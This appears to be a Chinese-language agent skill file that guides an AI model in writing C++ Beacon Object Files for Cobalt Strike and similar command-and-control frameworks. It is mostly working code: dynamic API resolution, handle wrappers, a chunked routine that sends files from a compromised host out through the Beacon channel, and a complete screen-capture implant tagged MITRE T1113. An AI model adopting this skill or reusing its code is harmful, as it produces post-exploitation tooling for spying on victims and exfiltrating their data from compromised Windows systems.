---
name: cpp-bof
description: >
  此技能适用于用户询问关于"cpp-bof"、"创建 C++ BOF"、"在 BOF 中利用 RAII/模板/类"、
  "使用 typedef+GetProcAddress DFR"、"集成 COM/GDI+"、"需要双编译（BOF+EXE）模式"等问题。
  为 Cobalt Strike 及兼容 C2 框架生成、编译和调试 C++ 格式的 Beacon Object Files (BOF)。
---

# C++ Beacon Object Files (BOF) 开发

本技能用于生成生产级 C++ BOF。C++ 为复杂 BOF 提供了优势：用于句柄管理的 RAII、模板、更强的类型安全以及 COM/GDI+ 集成。这些模式源自真实世界的 C++ BOF 实践。

## 使用场景

- 用户说"创建一个 C++ BOF"或"用类写一个 BOF"
- 需要 C++ 封装的复杂 Win32/COM/GDI+ 逻辑
- 需要在 BOF 内部用 RAII 模式自动清理句柄/资源
- 将现有 C++ 代码转换为 BOF
- 需要双编译支持（`#ifdef BOF` / 独立 EXE）

---

## 与 C BOF 的关键区别

| 方面 | C BOF | C++ BOF |
|--------|-------|---------|
| 编译器 | `x86_64-w64-mingw32-gcc` | `x86_64-w64-mingw32-g++` |
| 入口点 | `void go(char*, int)` | `extern "C" void go(char*, int)` |
| 异常 | 不适用 | **必须禁用** (`-fno-exceptions`) |
| RTTI | 不适用 | **必须禁用** (`-fno-rtti`) |
| STL | 不适用 | **禁止使用** — BOF 中没有 C++ 运行时 |
| 构造函数 | 不适用 | 静态/全局构造函数**不会**运行 |

> **关键规则：** C++ BOF 不得依赖 C++ 运行时（`libstdc++`）。
> 不能使用 `new`/`delete`、STL 容器、异常或 RTTI。

---

## 第一步——文件头和结构

```cpp
/**
 * @file       mybof.cpp
 * @brief      One-line description.
 *
 * Technique:  Name of technique / tradecraft
 * MITRE ATT&CK: T1113 (Screen Capture) — example
 * Target:     x86_64 Windows 10/11, Server 2016+
 *
 * Build:
 *   ../scripts/build_bof.sh mybof.cpp
 */

#include <windows.h>

extern "C" {
#include "beacon.h"
}
```

---

## 第二步——DFR 策略

### 策略 A：标准 DECLSPEC_IMPORT（推荐用于少于约 30 个导入的情况）

```cpp
/* ── KERNEL32 ─────────────────────────────────────────── */
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
```

### 策略 B：typedef + GetProcAddress（适用于大量导入或非标准 DLL）

当有大量 API 调用（30+）时，DECLSPEC_IMPORT DFR 可能触达链接器限制。改用 typedef 并在运行时解析：

```cpp
/* ── Typedefs for runtime resolution ──────────────────── */
typedef HGDIOBJ (WINAPI *fnSelectObject)(HDC, HGDIOBJ);
typedef BOOL    (WINAPI *fnBitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
typedef int     (WINAPI *fnGetSystemMetrics)(int);

/* ── Global function pointers ─────────────────────────── */
static fnSelectObject   pSelectObject   = NULL;
static fnBitBlt         pBitBlt         = NULL;
static fnGetSystemMetrics pGetSystemMetrics = NULL;

static BOOL ResolveAPIs(void) {
    HMODULE hGdi32  = KERNEL32$LoadLibraryA("gdi32.dll");
    HMODULE hUser32 = KERNEL32$LoadLibraryA("user32.dll");
    if (!hGdi32 || !hUser32) return FALSE;

    pSelectObject     = (fnSelectObject)KERNEL32$GetProcAddress(hGdi32, "SelectObject");
    pBitBlt           = (fnBitBlt)KERNEL32$GetProcAddress(hGdi32, "BitBlt");
    pGetSystemMetrics = (fnGetSystemMetrics)KERNEL32$GetProcAddress(hUser32, "GetSystemMetrics");

    return (pSelectObject && pBitBlt && pGetSystemMetrics);
}
```

在 `go()` 顶部调用 `ResolveAPIs()`，之后再使用任何已解析的指针。

> **何时使用策略 B：** GDI+、DirectX、COM 接口，或任何不常见链接的 DLL（gdiplus.dll、d3d11.dll、wlanapi.dll）。

---

## 第三步——RAII 封装器

C++ 在 BOF 中通过 RAII 实现自动清理的优势：

```cpp
class BofHandle {
    HANDLE h_;
public:
    explicit BofHandle(HANDLE h = NULL) : h_(h) {}
    ~BofHandle() {
        if (h_ && h_ != INVALID_HANDLE_VALUE)
            KERNEL32$CloseHandle(h_);
    }
    operator HANDLE() const { return h_; }
    HANDLE* operator&() { return &h_; }
    bool valid() const { return h_ && h_ != INVALID_HANDLE_VALUE; }
    BofHandle(const BofHandle&) = delete;
    BofHandle& operator=(const BofHandle&) = delete;
};
```

其他封装器（BofRegKey、BofFormat）见 `assets/bof_helpers.hpp`。

---

## 第四步——编译

```bash
./scripts/build_bof.sh mybof.cpp
```

| 参数 | 用途 |
|------|---------|
| `-m64 -c` | 目标 x64，仅编译 |
| `-fno-exceptions` | 禁用 C++ 异常（无运行时） |
| `-fno-rtti` | 禁用 RTTI（无 `typeid`、`dynamic_cast`） |
| `-fno-asynchronous-unwind-tables` | 减少 `.eh_frame` |
| `-fpack-struct=8` | 匹配 Beacon 结构体打包 |
| `-std=c++17` | 现代 C++ 特性 |

---

## 高级模式

### 双编译：BOF + 独立 EXE

在同一源码中同时支持 BOF 和独立编译：

```cpp
#ifdef BOF
extern "C" {
#include "beacon.h"
}
#define PRINT(fmt, ...) BeaconPrintf(CALLBACK_OUTPUT, fmt, ##__VA_ARGS__)
#define PRINT_ERR(fmt, ...) BeaconPrintf(CALLBACK_ERROR, fmt, ##__VA_ARGS__)
#else
#include <stdio.h>
#define PRINT(fmt, ...) printf(fmt "\n", ##__VA_ARGS__)
#define PRINT_ERR(fmt, ...) fprintf(stderr, fmt "\n", ##__VA_ARGS__)
#endif

void do_work(int pid) {
    PRINT("[+] Processing PID %d", pid);
    /* ... logic works in both modes ... */
}

#ifdef BOF
extern "C" void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    do_work(BeaconDataInt(&parser));
}
#else
int main(int argc, char** argv) {
    if (argc < 2) return 1;
    do_work(atoi(argv[1]));
    return 0;
}
#endif
```

编译为 BOF：`build_bof.sh mybof.cpp`（自动添加 `-DBOF`）。
编译为 EXE：`x86_64-w64-mingw32-g++ -o mybof.exe mybof.cpp`。

### 通过 Beacon 通道下载文件

使用 `CALLBACK_FILE*` 常量进行分块文件传输：

```cpp
static void downloadFile(const char* fileName, const char* data, int dataLen) {
    /* Start download — send filename */
    int msgLen = (int)MSVCRT$strlen(fileName) + 1;  /* include null */
    char* start = (char*)KERNEL32$HeapAlloc(
        KERNEL32$GetProcessHeap(), 0, 4 + msgLen);
    *(int*)start = msgLen;
    MSVCRT$memcpy(start + 4, fileName, msgLen);
    BeaconOutput(CALLBACK_FILE, start, 4 + msgLen);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, start);

    /* Send data in chunks */
    int offset = 0;
    while (offset < dataLen) {
        int chunk = dataLen - offset;
        if (chunk > 900 * 1024) chunk = 900 * 1024;  /* 900KB max */
        BeaconOutput(CALLBACK_FILE_WRITE, data + offset, chunk);
        offset += chunk;
    }

    /* Close download */
    BeaconOutput(CALLBACK_FILE_CLOSE, NULL, 0);
}
```

截图数据也可使用：`CALLBACK_SCREENSHOT`。

### GDI+ / COM 集成

动态加载非标准 DLL 并解析平坦 API：

```cpp
/* GDI+ flat API typedefs */
typedef int (WINAPI *fnGdiplusStartup)(ULONG_PTR*, void*, void*);
typedef void (WINAPI *fnGdiplusShutdown)(ULONG_PTR);
typedef int (WINAPI *fnGdipCreateBitmapFromHBITMAP)(HBITMAP, HPALETTE, void**);
typedef int (WINAPI *fnGdipSaveImageToStream)(void*, CLSID*, void*);

static HMODULE hGdiPlus = NULL;
static fnGdiplusStartup        pGdiplusStartup        = NULL;
static fnGdiplusShutdown       pGdiplusShutdown       = NULL;
static fnGdipCreateBitmapFromHBITMAP pGdipCreateBitmapFromHBITMAP = NULL;

static BOOL ResolveGdiPlus(void) {
    hGdiPlus = KERNEL32$LoadLibraryA("gdiplus.dll");
    if (!hGdiPlus) return FALSE;
    pGdiplusStartup = (fnGdiplusStartup)KERNEL32$GetProcAddress(hGdiPlus, "GdiplusStartup");
    pGdiplusShutdown = (fnGdiplusShutdown)KERNEL32$GetProcAddress(hGdiPlus, "GdiplusShutdown");
    pGdipCreateBitmapFromHBITMAP = (fnGdipCreateBitmapFromHBITMAP)
        KERNEL32$GetProcAddress(hGdiPlus, "GdipCreateBitmapFromHBITMAP");
    return (pGdiplusStartup && pGdiplusShutdown);
}
```

> **注意：** 在 BOF 中不要使用 `using namespace Gdiplus;`——这会导致 COMDAT 节与 Beacon 加载器冲突。请通过 GetProcAddress 解析使用平坦 C API（`GdipCreateBitmapFromHBITMAP` 等）。

### COM / IStream 使用

```cpp
typedef HRESULT (WINAPI *fnCreateStreamOnHGlobal)(HGLOBAL, BOOL, LPSTREAM*);
static fnCreateStreamOnHGlobal pCreateStreamOnHGlobal = NULL;

/* Resolve from ole32.dll */
HMODULE hOle32 = KERNEL32$LoadLibraryA("ole32.dll");
pCreateStreamOnHGlobal = (fnCreateStreamOnHGlobal)
    KERNEL32$GetProcAddress(hOle32, "CreateStreamOnHGlobal");

IStream* pStream = NULL;
pCreateStreamOnHGlobal(NULL, TRUE, &pStream);
/* ... use pStream ... */
pStream->Release();
```

### 可用与禁止对比

| 可用 | 禁止 |
|------|--------|
| 类 / 结构体（栈上） | `new` / `delete` |
| RAII（析构函数） | STL 容器 |
| 模板、`constexpr` | `<iostream>`、`<fstream>` |
| `static_assert`、`enum class` | 异常（`throw`/`catch`） |
| 命名空间、`auto`、引用 | RTTI（`dynamic_cast`、`typeid`） |
| 无捕获 Lambda | 带构造函数的全局对象 |

---

## 完整示例——screenshot.cpp

```cpp
/**
 * @file       screenshot.cpp
 * @brief      Capture screen and send via Beacon channel.
 *
 * Technique:  GDI screen capture + GDI+ JPEG encoding
 * MITRE ATT&CK: T1113 (Screen Capture)
 * Target:     x86_64 Windows 10/11
 */

#include <windows.h>

extern "C" {
#include "beacon.h"
}

/* ── KERNEL32 (DECLSPEC_IMPORT — few calls) ───────────── */
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);

/* ── GDI32 / USER32 (typedef — many calls) ────────────── */
typedef HDC     (WINAPI *fnGetDC)(HWND);
typedef int     (WINAPI *fnReleaseDC)(HWND, HDC);
typedef HDC     (WINAPI *fnCreateCompatibleDC)(HDC);
typedef HBITMAP (WINAPI *fnCreateCompatibleBitmap)(HDC, int, int);
typedef HGDIOBJ (WINAPI *fnSelectObject)(HDC, HGDIOBJ);
typedef BOOL    (WINAPI *fnBitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
typedef BOOL    (WINAPI *fnDeleteObject)(HGDIOBJ);
typedef BOOL    (WINAPI *fnDeleteDC)(HDC);
typedef int     (WINAPI *fnGetSystemMetrics)(int);

static fnGetDC                  pGetDC = NULL;
static fnReleaseDC              pReleaseDC = NULL;
static fnCreateCompatibleDC     pCreateCompatibleDC = NULL;
static fnCreateCompatibleBitmap pCreateCompatibleBitmap = NULL;
static fnSelectObject           pSelectObject = NULL;
static fnBitBlt                 pBitBlt = NULL;
static fnDeleteObject           pDeleteObject = NULL;
static fnDeleteDC               pDeleteDC = NULL;
static fnGetSystemMetrics       pGetSystemMetrics = NULL;

static BOOL ResolveAPIs(void) {
    HMODULE hGdi32  = KERNEL32$LoadLibraryA("gdi32.dll");
    HMODULE hUser32 = KERNEL32$LoadLibraryA("user32.dll");
    if (!hGdi32 || !hUser32) return FALSE;

    pGetDC                  = (fnGetDC)KERNEL32$GetProcAddress(hUser32, "GetDC");
    pReleaseDC              = (fnReleaseDC)KERNEL32$GetProcAddress(hUser32, "ReleaseDC");
    pGetSystemMetrics       = (fnGetSystemMetrics)KERNEL32$GetProcAddress(hUser32, "GetSystemMetrics");
    pCreateCompatibleDC     = (fnCreateCompatibleDC)KERNEL32$GetProcAddress(hGdi32, "CreateCompatibleDC");
    pCreateCompatibleBitmap = (fnCreateCompatibleBitmap)KERNEL32$GetProcAddress(hGdi32, "CreateCompatibleBitmap");
    pSelectObject           = (fnSelectObject)KERNEL32$GetProcAddress(hGdi32, "SelectObject");
    pBitBlt                 = (fnBitBlt)KERNEL32$GetProcAddress(hGdi32, "BitBlt");
    pDeleteObject           = (fnDeleteObject)KERNEL32$GetProcAddress(hGdi32, "DeleteObject");
    pDeleteDC               = (fnDeleteDC)KERNEL32$GetProcAddress(hGdi32, "DeleteDC");

    return (pGetDC && pCreateCompatibleDC && pBitBlt);
}

extern "C" void go(char* args, int len) {
    (void)args; (void)len;

    if (!ResolveAPIs()) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to resolve GDI APIs");
        return;
    }

    int cx = pGetSystemMetrics(0 /* SM_CXSCREEN */);
    int cy = pGetSystemMetrics(1 /* SM_CYSCREEN */);

    HDC hdcScreen = pGetDC(NULL);
    HDC hdcMem    = pCreateCompatibleDC(hdcScreen);
    HBITMAP hBmp  = pCreateCompatibleBitmap(hdcScreen, cx, cy);
    HGDIOBJ hOld  = pSelectObject(hdcMem, hBmp);

    pBitBlt(hdcMem, 0, 0, cx, cy, hdcScreen, 0, 0, 0x00CC0020 /* SRCCOPY */);

    /* TODO: encode hBmp to JPEG via GDI+ flat API, then:
     * BeaconOutput(CALLBACK_SCREENSHOT, jpegData, jpegLen);
     */

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Captured %dx%d screen", cx, cy);

    /* Cleanup */
    pSelectObject(hdcMem, hOld);
    pDeleteObject(hBmp);
    pDeleteDC(hdcMem);
    pReleaseDC(NULL, hdcScreen);
}
```

---

## 支持文件

| 文件 | 描述 |
|------|-------------|
| `scripts/bof_template.cpp`         | 包含 RAII + DFR 的生产级 C++ BOF 骨架 |
| `scripts/build_bof.sh`             | 带 C++ 参数的编译器封装脚本 |
| `references/REFERENCE.md`          | C++ BOF 模式、DFR 参考、常见陷阱 |
| `assets/beacon.h`                  | Cobalt Strike 官方 beacon 头文件（CS 4.12） |
| `assets/beacon_compatibility.h`    | 便利宏、MinGW 缺失类型定义 |
| `assets/bof_helpers.hpp`           | C++ BOF 的 RAII 封装器和工具模板 |
